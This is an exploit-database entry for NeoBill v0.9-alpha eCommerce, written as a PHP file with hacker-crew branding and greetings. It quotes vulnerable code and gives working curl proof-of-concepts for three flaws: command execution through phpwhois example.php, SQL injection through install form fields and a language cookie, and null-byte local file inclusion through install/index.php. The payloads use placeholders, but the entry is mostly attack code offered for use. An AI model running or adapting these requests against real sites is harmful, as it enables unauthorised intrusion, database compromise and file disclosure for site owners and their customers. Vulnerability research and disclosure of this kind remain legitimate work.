@@ -1,0 +1,169 @@
+id: 21616
+date: 12/04/2013
+title: NeoBill v0.9-alpha eCommerce <= (RCE/SQLi/LFI) Vulnerabilities
+author: KedAns-Dz
+cves: 
+
+<?php
+/*
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : 1337day.com                                   0
+1  [+] Support e-mail  : submit[at]1337day.com                         1
+0                                                                      0
+1               #########################################              1
+0               I'm KedAns-Dz member from Inj3ct0r Team                1
+1               #########################################              0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+[>] Title : NeoBill v0.9-alpha eCommerce <= (RCE/SQLi/LFI) Vulnerabilities
+
+[>] Author : KedAns-Dz
+[+] E-mail : ked-h (@hotmail.com / @1337day.com)
+[+] FaCeb0ok : fb.me/Inj3ct0rK3d
+[+] TwiTter : @kedans
+
+[#] Platform : PHP / WebApp
+[+] Cat/Tag : Multiple , Code Exec , SQL Inject , File Include
+
+[<] <3 <3 Greetings t0 Palestine <3 <3
+
+*/
+
+#***** [!] Description:
+/*
+
+> NeoBill v0.9-alpha is suffer from multiple vulnerabilities :
+  - RCE : in module ( nullregistrar/phpwhois )
+  - SQLi / LFI : some files in install !
+  * you can get/find install folder/path and exploit it 
+  even if the website install ( u can't re-install ) but
+ you can exploit the SQLi or the LFI there *_^ .  
+
+> ! : it's free exploit/p.o.c & pene-test for IT security
+
+*/
+#===== BUG (1) : [ Remote Code Exec ] =====>
+/* 
+
+ - function showhtml()
+ # in file : ( whois.utils.php ) /&&/ ( example.php ) 
+ # lines : ( 150 , 136 ) /&&/ ( 34 , 35 )
+
+if (isSet($_GET['query'])) {
+$query = $_GET['query'];
+
+preg_replace $out = preg_replace($ip_regex, '<a href="' . $_SERVER['PHP_SELF'] . '?' . $params . '">$0</a>', $out);
+function showhtml($result, $link_myself = true, $params = 'query=$0&amp;output=nice')
+
+ # require:
+ function showhtml($result, $link_myself = true, $params = 'query=$0&amp;output=nice')
+
+*/
+
+#--- Exploit (1) P.O.C : -----
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "http://[target]/modules/nullregistrar/phpwhois/example.php?query=[CMD]");
+curl_setopt($ch, CURLOPT_HTTPGET, 1);
+curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
+$buf = curl_exec ($ch);
+curl_close($ch);
+unset($ch);
+echo $buf;
+#---------------------------------
+
+#===== BUG (2) : [ Multiple SQL Injection ] =====>
+
+// Try to find install PATH/DIR is so vulnerable :p
+/*
+
+ - function create_admin()
+ # in file : (install/include/solidstate.php)
+ # lines : ( 178 , 168 , 162 , 169 , 163 , 172 , 166 , 160 , 167 ..)
+
+mysql_query("INSERT INTO `user` (`username`, `password`, `type`, `contactname`, `email`, `language`) 
+VALUES ('$username', '$password', 'Administrator', '$contactname', '$email', '{$_COOKIE['language']}');")
+
+$username = addslashes($_POST['username']);
+$username = $_POST['username'];
+$password = md5($_POST['password-1']);
+$password = md5(stripslashes($_POST['password-1'])); 
+$contactname = $firstname . ' ' . $lastname; 
+$firstname = addslashes($_POST['firstname']);
+$firstname = $_POST['firstname'];
+$lastname = addslashes($_POST['lastname']);
+
+*/
+#--- Exploit (2) P.O.C : -----
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "http://[target]/install/include/solidstate.php");
+curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
+curl_setopt($ch, CURLOPT_POSTFIELDS, "username='[SQLi]&firstname='[SQLi]&email='[SQLi]"); // or inject in only one ;)
+curl_setopt($ch, CURLOPT_COOKIE, "language='[SQLi]"); // SQLi via Cookie
+curl_setopt($ch, CURLOPT_COOKIEJAR, "/tmp/cookie_[target]"); // add cookie-jar header to exploit it ^^
+$buf = curl_exec ($ch);
+curl_close($ch);
+unset($ch);
+echo $buf;
+
+# note : the same exploit in other functions : create_company() 
+
+#---------------------------------
+
+#===== BUG (3) : [ Local File Include ] ====>
+
+/*
+
+ # in file : (install/index.php)
+ # lines : ( 35 , 36 , 37 , 38)
+
+require_once require_once 'languages/' . $_POST['language'] . '.php'; 
+if(isset($_POST['language']))
+
+require_once 'languages/' . $_COOKIE['language'] . '.php'; 
+if(isset($_COOKIE['language']))
+
+
+
+*/
+#--- Exploit (3) P.O.C : -----
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "http://[target]/install/index.php");
+curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, "language=[LFI]%00"); // LFI 1
+curl_setopt($ch, CURLOPT_COOKIE, "language=[LFI]%00"); // LFI 2 ( via cookie ^^ )
+curl_setopt($ch, CURLOPT_COOKIEJAR, "/tmp/cookie_[target]");
+$buf = curl_exec ($ch);
+curl_close($ch);
+unset($ch);
+echo $buf;
+#---------------------------------
+
+####
+#<! THE END ^_* ! , Good Luck all <3 | 1337-DAY Aint DIE ^_^  !>
+#<+ Proof Of Concept & Exploit Hunted by : Khaled [KedAns-Dz] +>
+#<+ Copyright © 2013 Inj3ct0r Team | 1337day Exploit Database +>
+# ** Greetings : < Dz Offenders Cr3w [&] Algerian Cyber Army > *
+# ** ! Hassi Messaoud <3 1850 Hood <3 , Dedicate fr0m Algeria **
+#---------------------------------------------------------------
+# Greetings to my Homies : Indoushka , Caddy-Dz , Kalashinkov3 ,
+# Chevr0sky , Mennouchi.Islem , KinG Of PiraTeS , TrOoN , T0xic,
+# & Jago-dz , Over-X , Kha&miX , Ev!LsCr!pT_Dz , Barbaros-DZ , &
+# & r0073r , KeyStr0ke , JF , Sid3^effectS , r4dc0re , CrosS , &
+# & KnocKout , Angel Injection , The Black Divels , kaMtiEz  , &
+# & Evil-Dz , Elite_Trojan , MalikPc , Marvel-Dz , Shinobi-Dz, &
+# =( packetstormsecurity.org * metasploit.com * OWASP & OSVDB )=
+####
+?>
+
+#  0day.today [2023-03-23]  #
